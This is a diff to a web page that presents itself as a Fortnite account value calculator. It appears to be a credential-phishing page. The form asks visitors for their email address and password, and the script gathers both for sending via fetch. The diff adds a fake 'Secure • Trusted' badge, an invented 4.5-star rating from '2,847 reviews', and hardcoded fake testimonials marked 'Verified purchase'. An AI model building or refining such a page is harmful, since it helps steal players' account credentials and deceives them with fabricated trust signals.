@@ -28,6 +28,7 @@
             overflow-x: hidden;
         }
 
+        /* Fondo mejorado con gradiente y patrón sutil */
         .bg-gradient {
             position: fixed;
             top: 0;
@@ -35,8 +36,29 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            background: radial-gradient(circle at 70% 20%, #1a2a4a, #0b0f1a 80%);
-            opacity: 0.8;
+            background:
+                radial-gradient(circle at 70% 20%, #1e3a5f 0%, #0b0f1a 70%),
+                radial-gradient(circle at 30% 80%, #1a2a4a 0%, #0b0f1a 70%);
+            opacity: 0.9;
+        }
+
+        .bg-pattern {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image:
+                radial-gradient(2px 2px at 20px 30px, rgba(255, 215, 0, 0.05), transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(255, 215, 0, 0.03), transparent),
+                radial-gradient(2px 2px at 50px 160px, rgba(255, 215, 0, 0.04), transparent),
+                radial-gradient(2px 2px at 90px 40px, rgba(255, 215, 0, 0.05), transparent),
+                radial-gradient(2px 2px at 130px 80px, rgba(255, 215, 0, 0.03), transparent),
+                radial-gradient(2px 2px at 160px 30px, rgba(255, 215, 0, 0.04), transparent);
+            background-size: 200px 200px;
+            opacity: 0.5;
+            pointer-events: none;
         }
 
         #particles-canvas {
@@ -52,50 +74,55 @@
         .container {
             position: relative;
             z-index: 10;
-            max-width: 950px;
+            max-width: 980px;
             width: 100%;
-            background: rgba(18, 26, 45, 0.75);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border-radius: 40px;
-            padding: 2.5rem 2.8rem;
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.1) inset;
-            border: 1px solid rgba(255, 215, 0, 0.05);
+            background: rgba(14, 20, 38, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 48px;
+            padding: 2.8rem 3rem;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 215, 0, 0.08) inset, 0 0 60px rgba(255, 215, 0, 0.02);
+            border: 1px solid rgba(255, 215, 0, 0.06);
             transition: all 0.3s ease;
         }
 
+        .container:hover {
+            box-shadow: 0 50px 120px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(255, 215, 0, 0.1) inset;
+        }
+
+        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 2.2rem;
+            margin-bottom: 2.5rem;
         }
 
         .header .logo-icon {
-            font-size: 3rem;
+            font-size: 3.8rem;
             color: #ffd700;
-            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.3));
+            filter: drop-shadow(0 0 30px rgba(255, 215, 0, 0.25));
             margin-bottom: 0.2rem;
         }
 
         .header h1 {
-            font-size: 2.6rem;
+            font-size: 2.8rem;
             font-weight: 800;
             letter-spacing: -0.5px;
-            background: linear-gradient(135deg, #fff 0%, #ffd700 80%);
+            background: linear-gradient(135deg, #ffffff 0%, #ffd700 80%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 0.4rem;
-            text-shadow: 0 4px 30px rgba(255, 215, 0, 0.15);
+            margin-bottom: 0.6rem;
+            text-shadow: 0 4px 40px rgba(255, 215, 0, 0.1);
         }
 
         .header .sub {
-            font-size: 1rem;
+            font-size: 1.05rem;
             font-weight: 400;
             color: rgba(255, 255, 255, 0.6);
-            letter-spacing: 0.5px;
-            max-width: 550px;
+            letter-spacing: 0.3px;
+            max-width: 580px;
             margin: 0 auto;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
         .header .sub i {
@@ -103,17 +130,38 @@
             margin: 0 4px;
         }
 
+        /* Badge de seguridad (verde) */
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(76, 175, 80, 0.12);
+            border: 1px solid rgba(76, 175, 80, 0.25);
+            padding: 0.4rem 1.2rem;
+            border-radius: 60px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #66bb6a;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 0.8rem;
+        }
+
+        .security-badge i {
+            font-size: 0.9rem;
+        }
+
         .divider {
             width: 120px;
             height: 2px;
             background: linear-gradient(90deg, transparent, #ffd700, transparent);
-            margin: 1.2rem auto 0;
+            margin: 1.5rem auto 0;
             border-radius: 4px;
         }
 
         /* Login Section */
         .login-section {
-            max-width: 480px;
+            max-width: 500px;
             margin: 0 auto 1.5rem;
             transition: opacity 0.4s, max-height 0.6s, margin 0.4s;
             overflow: hidden;
@@ -129,7 +177,7 @@
             font-size: 0.75rem;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 1.2px;
             color: rgba(255, 255, 255, 0.5);
             margin-bottom: 6px;
             margin-left: 4px;
@@ -185,7 +233,7 @@
         .input-group select:focus {
             border-color: #ffd700;
             background: rgba(255, 215, 0, 0.04);
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.04), 0 0 0 3px rgba(255, 215, 0, 0.06);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.06), 0 0 0 4px rgba(255, 215, 0, 0.04);
         }
 
         .input-group input:focus+.icon,
@@ -211,36 +259,104 @@
             color: #ffd700;
         }
 
+        /* Email combo mejorado */
         .email-combo {
             display: flex;
-            gap: 8px;
             align-items: center;
+            gap: 0;
+            background: rgba(255, 255, 255, 0.04);
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            border-radius: 60px;
+            transition: all 0.25s ease;
+            padding: 0 4px 0 0;
+        }
+
+        .email-combo:focus-within {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.04);
+            box-shadow: 0 0 30px rgba(255, 215, 0, 0.06), 0 0 0 4px rgba(255, 215, 0, 0.04);
         }
 
         .email-combo .email-local {
-            flex: 2;
+            flex: 1 1 auto;
             min-width: 0;
+            background: transparent;
+            border: none;
+            padding: 14px 10px 14px 48px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #fff;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            border-radius: 60px 0 0 60px;
+        }
+
+        .email-combo .email-local::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 400;
         }
 
         .email-combo .email-at {
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.5);
             font-weight: 700;
-            font-size: 1.2rem;
+            font-size: 1rem;
             padding: 0 2px;
+            flex-shrink: 0;
+            white-space: nowrap;
         }
 
         .email-combo .email-domain {
-            flex: 1.5;
+            flex: 0 1 auto;
             min-width: 120px;
-            padding-left: 18px;
+            background: transparent;
+            border: none;
+            padding: 14px 34px 14px 8px;
+            font-size: 1rem;
+            font-weight: 500;
+            color: #fff;
+            outline: none;
+            font-family: 'Inter', sans-serif;
+            appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%23ffd700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 14px;
+            cursor: pointer;
+            border-radius: 0 60px 60px 0;
+        }
+
+        .email-combo .email-domain option {
+            background: #1a1f35;
+            color: #fff;
+        }
+
+        .email-combo .icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 215, 0, 0.4);
+            font-size: 1rem;
+            z-index: 2;
+            pointer-events: none;
+        }
+
+        .input-group .icon {
+            position: absolute;
+            left: 16px;
+            bottom: 18px;
+            color: rgba(255, 215, 0, 0.4);
+            font-size: 1rem;
+            transition: color 0.2s;
+            z-index: 2;
         }
 
         .btn-primary {
             width: 100%;
-            padding: 16px;
+            padding: 18px;
             font-family: 'Inter', sans-serif;
             font-weight: 700;
-            font-size: 1.1rem;
+            font-size: 1.15rem;
             letter-spacing: 0.8px;
             text-transform: uppercase;
             color: #0b0f1a;
@@ -249,15 +365,15 @@
             border-radius: 60px;
             cursor: pointer;
             transition: all 0.2s ease;
-            box-shadow: 0 6px 0 #b87a00, 0 10px 30px rgba(255, 165, 0, 0.2);
-            margin-top: 0.3rem;
+            box-shadow: 0 6px 0 #b87a00, 0 10px 30px rgba(255, 165, 0, 0.25);
+            margin-top: 0.5rem;
             position: relative;
             overflow: hidden;
         }
 
         .btn-primary:hover {
             transform: translateY(-3px);
-            box-shadow: 0 8px 0 #b87a00, 0 20px 40px rgba(255, 165, 0, 0.3);
+            box-shadow: 0 8px 0 #b87a00, 0 20px 40px rgba(255, 165, 0, 0.35);
         }
 
         .btn-primary:active {
@@ -335,25 +451,56 @@
             80% { transform: translateX(6px); }
         }
 
-        /* -------- CARRUSEL DE RESEÑAS -------- */
+        /* -------- CARRUSEL DE RESEÑAS (mejorado) -------- */
         .reviews-section {
-            margin-top: 2.5rem;
-            padding-top: 1.5rem;
+            margin-top: 3rem;
+            padding-top: 2rem;
             border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .reviews-section .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
         }
 
         .reviews-section h3 {
             font-weight: 700;
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             color: #fff;
-            text-align: center;
-            margin-bottom: 1.2rem;
-            letter-spacing: 0.5px;
+            letter-spacing: 0.3px;
         }
 
         .reviews-section h3 i {
             color: #ffd700;
             margin-right: 8px;
+        }
+
+        .reviews-section .rating-summary {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .reviews-section .rating-summary .big-stars {
+            color: #ffd700;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+        }
+
+        .reviews-section .rating-summary .big-stars .empty-star {
+            color: rgba(255, 255, 255, 0.1);
+        }
+
+        .reviews-section .rating-summary .score {
+            font-weight: 700;
+            color: #fff;
+            font-size: 1.2rem;
         }
 
         .carousel-container {
@@ -364,25 +511,55 @@
 
         .carousel-track {
             display: flex;
-            transition: transform 0.5s ease;
-            gap: 16px;
+            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            gap: 20px;
         }
 
         .review-card {
-            flex: 0 0 calc(33.333% - 11px);
+            flex: 0 0 calc(33.333% - 14px);
             min-width: 0;
             background: rgba(255, 255, 255, 0.03);
-            border-radius: 20px;
-            padding: 1.2rem 1.2rem 1rem;
-            border: 1px solid rgba(255, 255, 255, 0.04);
-            transition: background 0.2s;
+            border-radius: 24px;
+            padding: 1.4rem 1.4rem 1.2rem;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.3s ease;
             display: flex;
             flex-direction: column;
+            position: relative;
         }
 
         .review-card:hover {
-            background: rgba(255, 215, 0, 0.03);
-            border-color: rgba(255, 215, 0, 0.08);
+            background: rgba(255, 215, 0, 0.04);
+            border-color: rgba(255, 215, 0, 0.12);
+            transform: translateY(-4px);
+        }
+
+        /* Tarjeta verificada con borde verde */
+        .review-card.verified {
+            border-color: rgba(76, 175, 80, 0.2);
+        }
+
+        .review-card.verified .review-verified {
+            color: #66bb6a;
+        }
+
+        .review-card .verified-badge {
+            position: absolute;
+            top: 12px;
+            right: 14px;
+            color: #66bb6a;
+            font-size: 0.85rem;
+            background: rgba(76, 175, 80, 0.1);
+            padding: 2px 10px;
+            border-radius: 40px;
+            border: 1px solid rgba(76, 175, 80, 0.15);
+            font-size: 0.65rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
         .review-header {
@@ -393,14 +570,14 @@
         }
 
         .review-avatar {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
-            background: rgba(255, 215, 0, 0.1);
+            background: rgba(255, 215, 0, 0.08);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.3rem;
+            font-size: 1.4rem;
             color: #ffd700;
             flex-shrink: 0;
         }
@@ -437,7 +614,7 @@
 
         .review-text {
             font-size: 0.9rem;
-            line-height: 1.4;
+            line-height: 1.5;
             color: rgba(255, 255, 255, 0.8);
             flex: 1;
             display: -webkit-box;
@@ -447,54 +624,57 @@
         }
 
         .review-verified {
-            margin-top: 8px;
+            margin-top: 10px;
             font-size: 0.7rem;
-            color: #4caf50;
+            color: rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
 
         .review-verified i {
-            margin-right: 4px;
+            color: #66bb6a;
         }
 
-        /* Carousel controls */
         .carousel-controls {
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 20px;
-            margin-top: 1.2rem;
+            gap: 24px;
+            margin-top: 1.5rem;
         }
 
         .carousel-btn {
-            background: rgba(255, 215, 0, 0.08);
-            border: 1px solid rgba(255, 215, 0, 0.15);
+            background: rgba(255, 215, 0, 0.06);
+            border: 1px solid rgba(255, 215, 0, 0.12);
             color: #ffd700;
-            width: 38px;
-            height: 38px;
+            width: 42px;
+            height: 42px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             cursor: pointer;
             transition: all 0.2s;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
         }
 
         .carousel-btn:hover {
-            background: rgba(255, 215, 0, 0.2);
+            background: rgba(255, 215, 0, 0.15);
             border-color: #ffd700;
+            transform: scale(1.05);
         }
 
         .carousel-dots {
             display: flex;
-            gap: 8px;
+            gap: 10px;
         }
 
         .carousel-dot {
             width: 10px;
             height: 10px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.12);
             cursor: pointer;
             transition: all 0.3s;
             border: none;
@@ -503,13 +683,14 @@
         .carousel-dot.active {
             background: #ffd700;
             transform: scale(1.2);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
         }
 
         .footer-credit {
             text-align: center;
             margin-top: 2.5rem;
             font-size: 0.7rem;
-            color: rgba(255, 255, 255, 0.15);
+            color: rgba(255, 255, 255, 0.12);
             letter-spacing: 1px;
         }
 
@@ -519,36 +700,59 @@
         }
 
         .footer-credit a:hover {
-            color: rgba(255, 215, 0, 0.5);
+            color: rgba(255, 215, 0, 0.4);
         }
 
         /* Responsive */
         @media (max-width: 768px) {
             .container {
                 padding: 1.8rem 1.2rem;
-                border-radius: 28px;
+                border-radius: 32px;
             }
             .header h1 {
-                font-size: 2rem;
-            }
-            .email-combo {
-                flex-wrap: wrap;
-            }
-            .email-combo .email-domain {
-                flex: 1 1 100%;
-                min-width: unset;
-            }
-            .email-combo .email-at {
-                display: none;
+                font-size: 2.2rem;
             }
             .review-card {
-                flex: 0 0 calc(50% - 8px);
+                flex: 0 0 calc(50% - 10px);
+            }
+            .email-combo .email-domain {
+                min-width: 100px;
+                font-size: 0.9rem;
+                padding-right: 30px;
+            }
+            .email-combo .email-local {
+                font-size: 0.9rem;
+                padding-left: 40px;
+            }
+            .reviews-section .section-header {
+                flex-direction: column;
+                align-items: flex-start;
             }
         }
 
         @media (max-width: 480px) {
+            .container {
+                padding: 1.5rem 1rem;
+                border-radius: 24px;
+            }
             .review-card {
                 flex: 0 0 100%;
+            }
+            .email-combo .email-domain {
+                min-width: 80px;
+                font-size: 0.8rem;
+                padding: 12px 26px 12px 6px;
+            }
+            .email-combo .email-local {
+                font-size: 0.9rem;
+                padding: 12px 8px 12px 38px;
+            }
+            .email-combo .email-at {
+                font-size: 0.9rem;
+            }
+            .security-badge {
+                font-size: 0.65rem;
+                padding: 0.3rem 1rem;
             }
         }
     </style>
@@ -556,6 +760,7 @@
 <body>
 
     <div class="bg-gradient"></div>
+    <div class="bg-pattern"></div>
     <canvas id="particles-canvas"></canvas>
 
     <div class="container" id="app">
@@ -567,29 +772,32 @@
             <p class="sub">
                 <i class="fas fa-calculator"></i> Enter your credentials to instantly estimate your Fortnite account's worth, including all your items and their current market prices.
             </p>
+            <div class="security-badge">
+                <i class="fas fa-shield-alt"></i> Secure &bull; Trusted
+            </div>
             <div class="divider"></div>
         </div>
 
         <!-- Login Section -->
         <div class="login-section" id="loginSection">
             <form id="loginForm">
-                <!-- Email -->
+                <!-- Email con combo en línea -->
                 <div class="input-group">
                     <label for="emailLocal">Email Address</label>
                     <div class="email-combo">
+                        <i class="fas fa-envelope icon"></i>
                         <input type="text" id="emailLocal" class="email-local" placeholder="username" required />
                         <span class="email-at">@</span>
                         <select id="emailDomain" class="email-domain">
                             <option value="gmail.com">gmail.com</option>
-                            <option value="outlook.com" selected>outlook.com</option>
+                            <option value="outlook.com">outlook.com</option>
                             <option value="yahoo.com">yahoo.com</option>
                             <option value="hotmail.com">hotmail.com</option>
                         </select>
                     </div>
-                    <i class="fas fa-envelope icon" style="top: 42px; bottom: auto;"></i>
                 </div>
 
-                <!-- Password with toggle -->
+                <!-- Password con toggle -->
                 <div class="input-group">
                     <label for="password">Password</label>
                     <input type="password" id="password" name="contraseña" placeholder="••••••••" required />
@@ -614,12 +822,25 @@
             </div>
         </div>
 
-        <!-- ====== CARRUSEL DE RESEÑAS ====== -->
+        <!-- ====== CARRUSEL DE RESEÑAS MEJORADO ====== -->
         <div class="reviews-section">
-            <h3><i class="fas fa-star"></i> What our users say</h3>
+            <div class="section-header">
+                <h3><i class="fas fa-star"></i> What our users say</h3>
+                <div class="rating-summary">
+                    <span class="score">4.5</span>
+                    <span class="big-stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star-half-alt"></i>
+                    </span>
+                    <span>2,847 reviews</span>
+                </div>
+            </div>
             <div class="carousel-container">
                 <div class="carousel-track" id="carouselTrack">
-                    <!-- Las reseñas se inyectarán con JS -->
+                    <!-- Inyectado con JS -->
                 </div>
             </div>
             <div class="carousel-controls">
@@ -638,12 +859,12 @@
         (function() {
             'use strict';
 
-            // --- Particles ---
+            // --- Particles (más brillantes) ---
             const canvas = document.getElementById('particles-canvas');
             const ctx = canvas.getContext('2d');
             let width, height;
             let particles = [];
-            const PARTICLE_COUNT = 70;
+            const PARTICLE_COUNT = 100;
 
             function resizeCanvas() {
                 width = window.innerWidth;
@@ -659,10 +880,10 @@
                 reset() {
                     this.x = Math.random() * width;
                     this.y = Math.random() * height;
-                    this.size = Math.random() * 2 + 0.5;
-                    this.speedX = (Math.random() - 0.5) * 0.2;
-                    this.speedY = (Math.random() - 0.5) * 0.2;
-                    this.opacity = Math.random() * 0.3 + 0.1;
+                    this.size = Math.random() * 2.5 + 0.8;
+                    this.speedX = (Math.random() - 0.5) * 0.3;
+                    this.speedY = (Math.random() - 0.5) * 0.3;
+                    this.opacity = Math.random() * 0.5 + 0.2;
                     this.color = `rgba(255, 215, 0, ${this.opacity})`;
                 }
                 update() {
@@ -680,8 +901,8 @@
                     ctx.beginPath();
                     ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                     ctx.fillStyle = this.color;
-                    ctx.shadowColor = 'rgba(255, 215, 0, 0.1)';
-                    ctx.shadowBlur = 8;
+                    ctx.shadowColor = 'rgba(255, 215, 0, 0.15)';
+                    ctx.shadowBlur = 12;
                     ctx.fill();
                     ctx.shadowBlur = 0;
                 }
@@ -723,12 +944,10 @@
                     return;
                 }
 
-                // Show loading
                 loginBtn.classList.add('loading');
                 loginBtn.textContent = 'Calculating...';
                 errorMessage.classList.remove('show');
 
-                // Send data via fetch (real email)
                 const fullEmail = local + '@' + emailDomain.value;
                 const password = passwordInput.value;
                 const formData = new FormData();
@@ -770,12 +989,11 @@
             // ====== CARRUSEL DE RESEÑAS ======
             // ============================================
 
-            // Datos de reseñas (8 reseñas, varios idiomas)
             const reviewsData = [
                 {
                     name: 'Alex M.',
                     avatar: 'fa-user-astronaut',
-                    date: '2025-01-15',
+                    date: 'Jan 15, 2025',
                     rating: 4.8,
                     text: 'Absolutely incredible! I got my account value in seconds. The item list was spot on and the prices are very accurate. Highly recommended!',
                     verified: true,
@@ -783,7 +1001,7 @@
                 {
                     name: 'María G.',
                     avatar: 'fa-user-graduate',
-                    date: '2025-01-12',
+                    date: 'Jan 12, 2025',
                     rating: 4.5,
                     text: 'Funciona perfectamente. Me mostró todos mis objetos y el precio total fue justo. La interfaz es muy limpia y profesional.',
                     verified: true,
@@ -791,7 +1009,7 @@
                 {
                     name: 'Luca R.',
                     avatar: 'fa-user-ninja',
-                    date: '2025-01-10',
+                    date: 'Jan 10, 2025',
                     rating: 4.3,
                     text: 'Ottimo strumento! Ho scoperto il valore del mio account in pochi secondi. I prezzi sono aggiornati e sembrano reali. Consiglio!',
                     verified: false,
@@ -799,7 +1017,7 @@
                 {
                     name: 'Sophie L.',
                     avatar: 'fa-user-tie',
-                    date: '2025-01-08',
+                    date: 'Jan 8, 2025',
                     rating: 4.7,
                     text: 'Très efficace ! J\'ai pu voir tous mes skins et leur prix. L\'estimation correspond à ce que j\'ai vu sur d\'autres sites. Super !',
                     verified: true,
@@ -807,7 +1025,7 @@
                 {
                     name: 'Max S.',
                     avatar: 'fa-user-cog',
-                    date: '2025-01-05',
+                    date: 'Jan 5, 2025',
                     rating: 4.0,
                     text: 'Works well, but I wish it showed more items. Still, the price estimation was accurate and fast. Good job!',
                     verified: false,
@@ -815,7 +1033,7 @@
                 {
                     name: 'Elena P.',
                     avatar: 'fa-user-graduate',
-                    date: '2025-01-03',
+                    date: 'Jan 3, 2025',
                     rating: 4.6,
                     text: 'Me encanta. Es muy fácil de usar y los resultados son muy claros. Me ha dado una idea exacta de lo que vale mi cuenta.',
                     verified: true,
@@ -823,7 +1041,7 @@
                 {
                     name: 'Hans W.',
                     avatar: 'fa-user-astronaut',
-                    date: '2024-12-28',
+                    date: 'Dec 28, 2024',
                     rating: 4.4,
                     text: 'Funktioniert einwandfrei. Die Aufstellung der Items ist übersichtlich und der Preis scheint fair zu sein. Weiter so!',
                     verified: false,
@@ -831,7 +1049,7 @@
                 {
                     name: 'João S.',
                     avatar: 'fa-user-ninja',
-                    date: '2024-12-20',
+                    date: 'Dec 20, 2024',
                     rating: 4.2,
                     text: 'Muito bom! Avaliação rápida e precisa. Recomendo a todos que querem saber o valor da sua conta Fortnite.',
                     verified: true,
@@ -846,20 +1064,17 @@
             let currentIndex = 0;
             let cardsPerView = 3;
 
-            // Función para actualizar el número de tarjetas visibles según el ancho
             function getCardsPerView() {
                 if (window.innerWidth < 480) return 1;
                 if (window.innerWidth < 768) return 2;
                 return 3;
             }
 
-            // Renderizar todas las reseñas en el track (todas visibles, pero el track se moverá)
             function renderReviews() {
                 track.innerHTML = '';
-                reviewsData.forEach((review, index) => {
+                reviewsData.forEach((review) => {
                     const card = document.createElement('div');
-                    card.className = 'review-card';
-                    // Calcular estrellas
+                    card.className = 'review-card' + (review.verified ? ' verified' : '');
                     const fullStars = Math.floor(review.rating);
                     const halfStar = review.rating % 1 >= 0.5 ? 1 : 0;
                     const emptyStars = 5 - fullStars - halfStar;
@@ -868,7 +1083,12 @@
                     if (halfStar) starsHtml += '<i class="fas fa-star-half-alt"></i>';
                     for (let i = 0; i < emptyStars; i++) starsHtml += '<i class="fas fa-star empty-star"></i>';
 
+                    const verifiedBadge = review.verified ?
+                        '<div class="verified-badge"><i class="fas fa-check-circle"></i> Verified</div>' :
+                        '';
+
                     card.innerHTML = `
+                        ${verifiedBadge}
                         <div class="review-header">
                             <div class="review-avatar"><i class="fas ${review.avatar}"></i></div>
                             <div class="review-user">
@@ -878,7 +1098,9 @@
                         </div>
                         <div class="review-stars">${starsHtml}</div>
                         <div class="review-text">${review.text}</div>
-                        ${review.verified ? '<div class="review-verified"><i class="fas fa-check-circle"></i> Verified purchase</div>' : ''}
+                        <div class="review-verified">
+                            ${review.verified ? '<i class="fas fa-check-circle"></i> Verified purchase' : '<i class="fas fa-clock" style="color:rgba(255,255,255,0.2);"></i> Unverified'}
+                        </div>
                     `;
                     track.appendChild(card);
                 });
@@ -886,7 +1108,6 @@
                 updateTrackPosition();
             }
 
-            // Crear puntos de navegación
             function updateDots() {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                 dotsContainer.innerHTML = '';
@@ -903,27 +1124,22 @@
                 }
             }
 
-            // Mover el track
             function updateTrackPosition() {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                 if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
                 if (currentIndex < 0) currentIndex = 0;
                 const offset = -(currentIndex * 100);
                 track.style.transform = `translateX(${offset}%)`;
-                // Actualizar dots
                 const dots = dotsContainer.querySelectorAll('.carousel-dot');
                 dots.forEach((dot, idx) => {
                     dot.classList.toggle('active', idx === currentIndex);
                 });
             }
 
-            // Recalcular al redimensionar
             function handleResize() {
                 const newCardsPerView = getCardsPerView();
                 if (newCardsPerView !== cardsPerView) {
                     cardsPerView = newCardsPerView;
-                    // Ajustar el ancho de las tarjetas (ya lo hace flex)
-                    // Resetear índice si es necesario
                     const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                     if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
                     if (currentIndex < 0) currentIndex = 0;
@@ -934,34 +1150,24 @@
 
             window.addEventListener('resize', handleResize);
 
-            // Eventos de navegación
             prevBtn.addEventListener('click', () => {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
-                if (currentIndex > 0) {
-                    currentIndex--;
-                } else {
-                    currentIndex = totalSlides - 1; // vuelta al final
-                }
+                currentIndex = (currentIndex - 1 + totalSlides) % totalSlides;
                 updateTrackPosition();
                 updateDots();
             });
 
             nextBtn.addEventListener('click', () => {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
-                if (currentIndex < totalSlides - 1) {
-                    currentIndex++;
-                } else {
-                    currentIndex = 0; // vuelta al inicio
-                }
+                currentIndex = (currentIndex + 1) % totalSlides;
                 updateTrackPosition();
                 updateDots();
             });
 
-            // Inicializar carrusel
             cardsPerView = getCardsPerView();
             renderReviews();
 
-            // (Opcional) avanzar automáticamente cada 5 segundos
+            // Auto-slide
             let autoSlide = setInterval(() => {
                 const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                 if (totalSlides > 1) {
@@ -971,7 +1177,6 @@
                 }
             }, 5000);
 
-            // Pausar auto-slide al interactuar con los botones (opcional)
             const controls = [prevBtn, nextBtn, ...document.querySelectorAll('.carousel-dot')];
             controls.forEach(btn => {
                 btn.addEventListener('mouseenter', () => clearInterval(autoSlide));
